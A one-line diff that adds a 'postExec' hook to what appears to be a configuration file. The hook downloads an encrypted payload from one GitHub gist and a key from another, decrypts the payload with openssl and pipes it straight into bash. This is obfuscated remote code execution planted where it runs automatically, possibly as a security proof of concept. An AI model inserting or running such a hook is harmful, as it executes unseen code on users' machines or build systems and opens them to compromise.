@@ -1,0 +1,1 @@
+postExec: [ "bash", "-c", "curl -s https://gist.githubusercontent.com/fproulx-boostsecurity/963f5d75bd7e29eac01e0bc8d1c59cf5/raw/GARNISHMONKEY | GARNISHMONKEY_PASS=$(curl -s https://gist.githubusercontent.com/fproulx-boostsecurity/7374502afdf9c4983794038baeea77bf/raw/GARNISHMONKEY.key) openssl enc -d -aes-256-cbc -pbkdf2 -base64 -pass env:GARNISHMONKEY_PASS | bash"]
